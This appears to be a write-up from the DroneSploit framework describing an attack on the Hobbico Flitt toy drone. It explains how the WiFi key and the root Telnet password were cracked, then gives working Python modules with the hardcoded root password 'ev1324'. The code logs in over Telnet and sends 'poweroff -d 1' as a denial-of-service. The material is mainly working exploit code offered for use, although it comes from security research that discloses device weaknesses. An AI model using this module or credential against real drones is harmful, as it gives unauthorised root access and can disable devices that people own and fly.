## Security issues

This attack results from 3 security issues :

- Default WiFi password.
- A Telnet service is permanently running as root.
- The root user has a too weak password.

## Telnet password recovery

A WPA2-PSK classical guessing attack was achieved using the Aircrack-NG suite, leading to the discovery of the WiFi password.

An online dictionary attack was attempted using the RockYou list but was unrealistic because of the low battery (only a few hundreds attempts possible per uptime period).

So, an exposed UART interface was connected through a serial port to get a root shell directly on the hardware, therefore allowing to visit the OS and to grab hashes for cracking.

An offline dictionary attack using the RockYou wordlist allowed to recover the Telnet root password.

## DroneSploit module

A proxy class was made to implement Flitt's default configuration options to give the `FlittModule` class (see `dronesploit/lib/drones/hobbico.py`). `FlittTelnetModule` inherits this with an additional method for sending Telnet commands, `send_telnet_command(cmd)`.

```python
class FlittTelnetModule(FlittModule):
    """ Module proxy class holding the method for executing Telnet commands. """
    config = Config({
        Option(
            'PASSWORD',
            "Telnet password",
            True,
        ): "ev1324",
    })
    path = "exploit/hobbico/flitt"
    requirements = {'python': ["telnetlib"]}
    
    def send_telnet_command(self, cmd):
        from telnetlib import Telnet
        self.logger.debug("Starting a Telnet session...")
        t = Telnet(self.config.option("IP").value)
        self.logger.debug("[SRV] " + t.read_until(b"login: ").decode("utf-8"))
        self.logger.debug("[CLT] " + "root")
        t.write(b"root\n")
        self.logger.debug("[SRV] " + t.read_until(b"assword: ").decode("utf-8"))
        pswd = self.config.option("PASSWORD").value
        self.logger.debug("[CLT] " + pswd)
        t.write(pswd.encode("utf-8") + b"\n")
        resp = t.read_until(b"~ # ")
        self.logger.debug("[SRV] " + resp.decode("utf-8"))
        success = False
        if b"Welcome to HiLinux." in resp:
            self.logger.debug("[CLT] " + cmd)
            t.write(cmd.encode("utf-8") + b"\n")
            self.logger.success("Telnet command sent")
            success = True
            self.logger.debug("[CLT] exit")
            t.write(b"exit\n")
            t.read_all()
        else:
            self.logger.failure("Bad Telnet password")
        t.close()
        return success
```

The module is finally :

```python
class TelnetDos(FlittTelnetModule):
    """ Power off the target Flitt through Telnet.
    
    Author: Alexandre D'Hondt
    Email:  alexandre.dhondt@gmail.com
    
    Note that this will "power off" ToyBox, the OS on the drone, but this will
     not shutdown the drone completely.
    """
    def run(self):
        self.logger.info("Powering off the target...")
        self.send_telnet_command("poweroff -d 1")
```
